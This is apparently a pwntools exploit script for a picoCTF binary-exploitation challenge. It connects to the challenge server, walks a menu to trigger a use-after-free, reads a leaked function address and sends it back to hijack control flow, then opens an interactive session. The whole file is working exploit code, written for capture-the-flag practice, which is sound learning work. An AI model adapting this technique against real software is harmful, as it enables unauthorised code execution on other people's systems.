import pwn

elf = pwn.ELF("./vuln")

#winadd = pwn.p32(elf.symbols["win"])

#offset = 64
#0x80487d6
#p = elf.process()
p = pwn.remote("mercury.picoctf.net", 58574)
p.sendlineafter(b'(e)xit\n',b'M')
p.sendlineafter(b': \n',b'test')

p.sendlineafter(b'(e)xit\n',b'S')
p.recvuntil(b'OOP! Memory leak...', drop=True)
leak = int(p.recvlineS(),16)

p.sendlineafter(b'(e)xit\n',b'I')
p.sendlineafter(b'?\n',b'Y')

p.sendlineafter(b'(e)xit\n',b'L')
p.sendlineafter(b':\n',pwn.flat(leak))
#pwn.warn(p.recvlines(2)[1].decode())

p.interactive()
